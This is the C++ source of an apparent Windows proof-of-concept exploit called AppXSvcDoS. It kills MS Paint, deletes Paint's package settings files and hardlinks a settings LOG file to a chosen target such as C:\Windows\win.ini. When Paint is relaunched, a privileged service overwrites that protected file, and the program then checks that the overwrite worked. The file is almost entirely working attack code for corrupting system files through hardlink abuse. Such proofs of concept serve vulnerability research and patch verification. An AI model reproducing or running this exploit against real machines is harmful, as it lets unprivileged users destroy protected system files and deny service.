#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"
#include <TlHelp32.h>
#include <tchar.h>
#include "winbase.h"
#include <wchar.h>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <aclapi.h>
#include <iostream>
#include <fstream>
#include <iostream>
#include <comdef.h>
#include "base64.h"
#pragma comment(lib, "advapi32.lib")
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname)
{
	std::wstring full_linkname = BuildFullPath(linkname, true);
	size_t len = full_linkname.size() * sizeof(WCHAR);

	typed_buffer_ptr<FILE_LINK_INFORMATION> link_info(sizeof(FILE_LINK_INFORMATION) + len - sizeof(WCHAR));

	memcpy(&link_info->FileName[0], full_linkname.c_str(), len);
	link_info->ReplaceIfExists = TRUE;
	link_info->FileNameLength = len;

	std::wstring full_targetname = BuildFullPath(targetname, true);

	HANDLE hFile = OpenFileNative(full_targetname.c_str(), nullptr, MAXIMUM_ALLOWED, FILE_SHARE_READ, 0);
	if (hFile)
	{
		DEFINE_NTDLL(ZwSetInformationFile);
		IO_STATUS_BLOCK io_status = { 0 };

		NTSTATUS status = fZwSetInformationFile(hFile, &io_status, link_info, link_info.size(), FileLinkInformation);
		CloseHandle(hFile);
		if (NT_SUCCESS(status))
		{
			return true;
		}
		SetNtLastError(status);
	}

	return false;
}

bool DeleteDatFiles() {
	printf("[*] Deleting DAT files...\n");

	std::wstring userProfile(_wgetenv(L"USERPROFILE"));
	std::wstring packagePath(L"\\AppData\\Local\\Packages\\Microsoft.MSPaint_8wekyb3d8bbwe\\Settings\\");
	std::wstring filePath(L"settings.*");

	WIN32_FIND_DATAW fd;
	std::wstring lpFileName(userProfile + packagePath + filePath);
	HANDLE hFind = FindFirstFileW(lpFileName.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			std::wstring lpFileName(userProfile + packagePath + fd.cFileName);
			printf("\t[+] Deleting %ls\n", lpFileName.c_str());
			DeleteFileW(lpFileName.c_str());
		} while (FindNextFileW(hFind, &fd));
		FindClose(hFind);
	}
	else {
		printf("[!] Error deleting files: %ls\n", GetErrorMessage().c_str());
		return false;
	}
	return true;
}

bool IsProcessRunning(const wchar_t* processName) {
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry)) {
		while (Process32Next(snapshot, &entry))
		{
			if (!wcsicmp(entry.szExeFile, processName))
			{
				exists = true;
			}
		}
	}

	CloseHandle(snapshot);
	return exists;
}

void KillProcessByName(const wchar_t* fileName)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcscmp(pEntry.szExeFile, fileName) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

bool FileExists(const wchar_t* fileName) {
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(fileName) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		return false;
	}
	else
	{
		return true;
	}
}

bool CheckFileStatus(_TCHAR* targetFile) {
	printf("[*] Checking file attributes and size of %ls ...\n", targetFile);

	HANDLE hFile = CreateFile(targetFile,
		FILE_READ_ATTRIBUTES,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		bool is8k = (GetFileSize(hFile, NULL) == 0x2000);
		bool isHidden = FILE_ATTRIBUTE_HIDDEN & GetFileAttributes(targetFile);
		if (isHidden && is8k)
		{
			printf("[+] %ls has been successfully overwritten!\n", targetFile);
			CloseHandle(hFile);
			return true;
		}
	}

	printf("[!] Something somewhere went terribly wrong...\n");
	return false;
}

bool CreateHardlink(_TCHAR* src, _TCHAR* dst) {
	if (CreateNativeHardlink(src, dst))
	{
		return true;
	}
	else
	{
		printf("\n[!] Error creating hardlink: %ls\n", GetErrorMessage().c_str());
		return false;
	}
}

void StartPaint() {
	printf("[*] Starting Paint ...\n");
	system("start ms-paint:");
}

void KillPaint() {
	TCHAR* processName = L"PaintStudio.View.exe";

	printf("[*] Checking if %ls is currently running ... ", processName);
	if (IsProcessRunning(processName))
	{
		printf("YES!\n");
		printf("[!] Killing %ls ", processName);
		while (IsProcessRunning(processName))
		{
			printf(".");
			KillProcessByName(processName);
		}
		printf("\n");
	}
	else
	{
		printf("NO!\n");
	}
}

bool CreateMaliciousDatFile(_TCHAR* datFile, _TCHAR* dstFile) {
	bstr_t userProfile(_wgetenv(L"USERPROFILE"));
	bstr_t packagePath(L"\\AppData\\Local\\Packages\\Microsoft.MSPaint_8wekyb3d8bbwe\\Settings\\");
	bstr_t srcFile(userProfile + packagePath + datFile);
	
	printf("[*] Checking if %ls exists ... ", datFile);
	if (FileExists(srcFile))
	{
		printf("YES!\n");
	}
	else
	{
		printf("NO!\n");
	}
	
	printf("[+] Creating hard link to %ls ... ", dstFile);
	if (CreateHardlink(srcFile, dstFile))
	{
		printf("DONE!\n");
		return true;
	}

	return false;
}

int _tmain(int argc, _TCHAR* argv[])
{
	try
	{
		if (argc < 3)
		{
			printf("-----------------------------------------------------------------\n");
			printf("[*] Usage: AppXSvcDoS.exe <src> <dst>\n");
			printf("[*] (E.g., AppXSvcDoS.exe settings.dat.LOG1 C:\\Windows\\win.ini)\n");
			printf("-----------------------------------------------------------------\n");
		}
		else
		{
			KillPaint();
			Sleep(3000);
			DeleteDatFiles();
			CreateMaliciousDatFile(argv[1], argv[2]);
			Sleep(3000);
			StartPaint();
			Sleep(3000);
			KillPaint();
			CheckFileStatus(argv[2]);
		}
	}
	catch (...)
	{

	}
	exit(0);
}